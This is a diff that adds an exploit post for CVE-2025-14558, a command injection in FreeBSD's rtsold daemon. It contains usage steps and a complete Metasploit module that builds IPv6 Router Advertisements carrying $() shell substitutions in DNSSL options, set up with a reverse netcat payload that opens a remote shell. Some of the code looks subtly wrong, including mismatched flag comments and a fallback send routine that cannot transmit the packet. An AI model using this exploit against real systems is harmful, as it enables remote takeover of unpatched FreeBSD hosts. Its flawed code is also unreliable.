@@ -1,0 +1,258 @@
+=============================================================================================================================================
+| # Title     : FreeBSD 15.x rtsold DNSSL Command Injection                                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.freebsd.org/                                                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/213577/ & 	CVE-2025-14558
+
+[+] Summary    : This Metasploit module targets a command injection vulnerability in the FreeBSD rtsold daemon related to the handling of DNSSL (DNS Search List) options in IPv6 Router Advertisements. 
+                 Due to improper validation of domain names, attacker-controlled DNSSL values can inject shell commands via $() substitution when processed by the resolvconf script. 
+                 Successful exploitation requires Layer 2 adjacency and ACCEPT_RTADV enabled on the target, and may result in remote command execution on vulnerable FreeBSD systems prior to the official patches.
+
+[+] Usage :
+
+msfconsole
+msf> use exploit/bsd/ipv6/rtsold_dnssl_rce
+msf> set INTERFACE eth0
+msf> set PAYLOAD cmd/unix/reverse_netcat
+msf> set LHOST 192.168.1.100
+msf> set LPORT 4444
+msf> exploit
+
+[+] POC :
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Raw
+  include Msf::Exploit::Remote::Ipv6
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'FreeBSD rtsold DNSSL Command Injection',
+      'Description'    => %q{
+        This module exploits CVE-2025-14558, a command injection vulnerability in
+        FreeBSD's rtsold daemon. The vulnerability exists in the processing of
+        DNSSL (DNS Search List) options in IPv6 Router Advertisements.
+        
+        rtsold processes DNSSL options without validating domain names for shell
+        metacharacters. The decoded domains are passed to resolvconf(8), a shell
+        script that uses unquoted variable expansion, enabling command injection
+        via $() substitution.
+        
+        This exploit requires layer 2 adjacency to the target and the target must
+        be running rtsold with ACCEPT_RTADV enabled.
+      },
+      'Author'         => ['indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     => [
+        ['CVE', '2025-14558'],
+        ['URL', 'https://security.FreeBSD.org/advisories/FreeBSD-SA-25:12.rtsold.asc'],
+        ['URL', 'https://github.com/JohannesLks/CVE-2025-14558']
+      ],
+      'DisclosureDate' => '2025-12-16',
+      'Platform'       => 'bsd',
+      'Arch'           => ARCH_CMD,
+      'Payload'        => {
+        'BadChars' => '',
+        'Compat'   => {
+          'PayloadType' => 'cmd',
+          'RequiredCmd' => 'generic'
+        }
+      },
+      'Targets'        => [
+        ['FreeBSD 13.x-15.x (before patches)', {}]
+      ],
+      'DefaultTarget'  => 0,
+      'Notes'          => {
+        'Stability'   => [CRASH_SAFE],
+        'Reliability' => [REPEATABLE_SESSION],
+        'SideEffects' => [IOC_IN_LOGS]
+      }
+    ))
+
+    register_options([
+      OptString.new('INTERFACE', [true, 'Network interface to use', 'eth0']),
+      OptInt.new('COUNT', [true, 'Number of RA packets to send', 3]),
+      OptInt.new('ROUTER_LIFETIME', [true, 'Router lifetime in seconds', 1800]),
+      OptString.new('SOURCE_MAC', [false, 'Source MAC address (defaults to interface MAC)']),
+      OptString.new('SOURCE_IPV6', [false, 'Source IPv6 address', 'fe80::1'])
+    ])
+
+    deregister_options('RHOSTS', 'RPORT')
+  end
+
+  def check
+
+    Exploit::CheckCode::Unknown
+  end
+
+  def encode_domain(name)
+    result = ""
+    name.split(".").each do |label|
+      next if label.empty?
+      data = label
+      result << [data.length].pack('C') + data
+    end
+    result << "\x00"
+  end
+
+  def encode_payload(cmd)
+    payload = "$(#{cmd})"
+    
+    if payload.length > 63
+      result = ""
+      while !payload.empty?
+        chunk = payload.slice!(0, 63)
+        result << [chunk.length].pack('C') + chunk
+      end
+      result << "\x00"
+    else
+      [payload.length].pack('C') + payload + "\x00"
+    end
+  end
+
+  def build_dnssl_option(cmd, lifetime = 0xFFFFFFFF)
+    data = encode_domain("x.local") + encode_payload(cmd)
+
+    pad_len = (8 - (data.length + 8) % 8) % 8
+    data << "\x00" * pad_len
+
+    length = (8 + data.length) / 8
+    
+    dnssl = [
+      31,             # Type: DNSSL (31)
+      length,         # Length
+      0,              # Reserved
+      lifetime        # Lifetime
+    ].pack('CCnN')
+    
+    dnssl + data
+  end
+
+  def build_router_advertisement
+    src_mac = datastore['SOURCE_MAC']
+    src_mac ||= get_mac(datastore['INTERFACE'])
+
+    eth = PacketFu::EthPacket.new
+    eth.eth_saddr = src_mac
+    eth.eth_daddr = "33:33:00:00:00:01"  # All-nodes multicast
+    
+    ipv6 = PacketFu::IPv6Packet.new
+    ipv6.ipv6_hop = 255
+    ipv6.ipv6_saddr = datastore['SOURCE_IPV6']
+    ipv6.ipv6_daddr = "ff02::1"  # All-nodes multicast
+    
+ 
+    ra_header = [
+      134,    # Type: Router Advertisement
+      0,      # Code
+      0,      # Checksum (will be calculated later)
+      64,     # Cur Hop Limit
+      0,      # Flags (M=0, O=1)
+      1800    # Router Lifetime
+    ].pack('CCnCCn')
+
+    slaac_opt = [
+      1,      # Type: Source Link-Layer Address
+      1,      # Length in 8-octet units
+      src_mac.gsub(':', '').scan(/../).map { |x| x.hex }
+    ].flatten.pack('CCa6')
+
+    prefix_opt = [
+      3,      # Type: Prefix Information
+      4,      # Length in 8-octet units
+      64,     # Prefix Length
+      0x80,   # Flags (L=1, A=1)
+      0,      # Valid Lifetime
+      0,      # Preferred Lifetime
+      0,      # Reserved
+      # Prefix: 2001:db8::
+      0x20, 0x01, 0x0d, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
+    ].pack('CCCCNNNa16')
+
+    dnssl_opt = build_dnssl_option(payload.encoded)
+
+    icmp_payload = ra_header + slaac_opt + prefix_opt + dnssl_opt
+
+    checksum = ipv6_checksum(ipv6, icmp_payload)
+    icmp_payload[2, 2] = [checksum].pack('n')
+
+    eth.body = ipv6.to_s + icmp_payload
+    eth
+  end
+
+  def ipv6_checksum(ipv6_packet, payload)
+
+    pseudo_header = [
+      ipv6_packet.ipv6_saddr.split(':').map { |x| x.hex }.pack('n*'),
+      ipv6_packet.ipv6_daddr.split(':').map { |x| x.hex }.pack('n*'),
+      payload.length,
+      0,
+      58  # ICMPv6 protocol number
+    ].pack('a16a16NNn')
+    
+    sum = 0
+    (pseudo_header + payload).unpack('n*').each do |word|
+      sum += word
+    end
+    
+    while sum > 0xffff
+      sum = (sum & 0xffff) + (sum >> 16)
+    end
+    
+    ~sum & 0xffff
+  end
+
+  def get_mac(interface)
+
+    mac = nil
+    File.open("/sys/class/net/#{interface}/address", "r") do |f|
+      mac = f.read.strip
+    end
+    mac
+  rescue
+    nil
+  end
+
+  def exploit
+    print_status("Building malicious Router Advertisement...")
+    packet = build_router_advertisement
+    
+    print_status("Sending #{datastore['COUNT']} RA packets via #{datastore['INTERFACE']}...")
+    
+    datastore['COUNT'].times do |i|
+      begin
+        send_packet(packet, datastore['INTERFACE'])
+        print_good("Sent RA packet #{i + 1}/#{datastore['COUNT']}")
+        sleep 1 if i < datastore['COUNT'] - 1
+      rescue => e
+        print_error("Failed to send packet #{i + 1}: #{e.message}")
+      end
+    end
+    
+    print_status("Exploit complete. Check for session.")
+  end
+
+  def send_packet(packet, interface)
+ 
+    pcap = PCAPRUB::Pcap.open_live(interface, 65535, true, 0)
+    pcap.inject(packet.to_s)
+    pcap.close
+  rescue LoadError
+
+    system("echo '#{packet.to_s.unpack('H*').first}' | xxd -r -p | sudo ip -6 neigh add ff02::1 dev #{interface} nud permanent")
+  end
+end
+	
+Greetings to :============================================================
+jericho * Larry W. Cashdollar * r00t * Malvuln (John Page aka hyp3rlinx)*|
+==========================================================================
